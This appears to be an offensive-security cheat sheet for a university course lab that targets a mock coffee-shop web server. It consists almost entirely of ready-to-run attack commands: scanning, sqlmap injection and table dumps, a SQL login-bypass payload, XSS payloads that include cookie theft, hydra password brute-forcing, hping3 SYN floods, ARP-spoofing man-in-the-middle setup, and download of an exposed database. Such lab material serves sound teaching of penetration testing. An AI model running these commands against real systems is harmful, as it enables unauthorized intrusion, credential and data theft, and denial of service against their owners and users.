# CIS 3353 - Attack Cheat Sheet
# ================================
# Target: Jokopi Coffee Shop ($TARGET_IP)

## 1. RECONNAISSANCE
```
# Full port scan
nmap -sV -sC -O -p- $TARGET_IP -oN /root/results/scans/full-scan.txt

# Quick scan
nmap -sV -T4 $TARGET_IP -oN /root/results/scans/quick-scan.txt

# Network discovery
nmap -sn $NETWORK_RANGE -oN /root/results/scans/network-discovery.txt

# Web server enumeration
nikto -h http://$TARGET_IP -o /root/results/scans/nikto-report.txt

# Directory brute-force
dirb http://$TARGET_IP /usr/share/dirb/wordlists/common.txt -o /root/results/scans/dirb-results.txt
```

## 2. SQL INJECTION
```
# Test login form for SQLi
sqlmap -u "http://$TARGET_IP/api/login.php" --data="username=admin&password=test" --batch --dbs

# Test search endpoint
sqlmap -u "http://$TARGET_IP/api/search.php?q=coffee" --batch --dbs

# Dump users table
sqlmap -u "http://$TARGET_IP/api/search.php?q=coffee" --batch -D coffeeshop -T users --dump

# Manual SQLi test
curl -X POST http://$TARGET_IP/api/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"anything"}'
```

## 3. CROSS-SITE SCRIPTING (XSS)
```
# Reflected XSS via search
curl "http://$TARGET_IP/api/search.php?q=<script>alert('XSS')</script>"

# Stored XSS via comments
curl -X POST http://$TARGET_IP/api/comment.php \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","comment":"<script>alert(document.cookie)</script>"}'
```

## 4. BRUTE-FORCE LOGIN
```
# Hydra brute-force (HTTP POST)
hydra -l admin -P /root/wordlists/coffee-passwords.txt \
  $TARGET_IP http-post-form \
  "/api/login.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -o /root/results/exploits/brute-force.txt

# Quick test with custom wordlist
hydra -L /root/wordlists/coffee-passwords.txt -P /root/wordlists/coffee-passwords.txt \
  $TARGET_IP http-post-form \
  "/api/login.php:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid:H=Content-Type: application/json"
```

## 5. NETWORK ATTACKS
```
# SYN Flood (DoS simulation) - run for 30 seconds
timeout 30 hping3 -S --flood -V -p 80 $TARGET_IP

# ARP Spoofing (MITM)
# First enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t $TARGET_IP $FIREWALL_IP

# TCP connection flood
hping3 --syn --flood --rand-source -p 80 $TARGET_IP
```

## 6. DATA EXFILTRATION
```
# Access exposed database
curl http://$TARGET_IP/data/coffeeshop.db -o /root/results/exploits/stolen-db.db
sqlite3 /root/results/exploits/stolen-db.db "SELECT * FROM users;"
sqlite3 /root/results/exploits/stolen-db.db "SELECT * FROM orders;"

# Access server info
curl http://$TARGET_IP/api/info.php > /root/results/exploits/phpinfo.html
```

## 7. SAVE EVIDENCE
```
# Always save command output to /root/results/
# Use timestamps in filenames:
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
nmap -sV $TARGET_IP -oN /root/results/scans/nmap_${TIMESTAMP}.txt
```
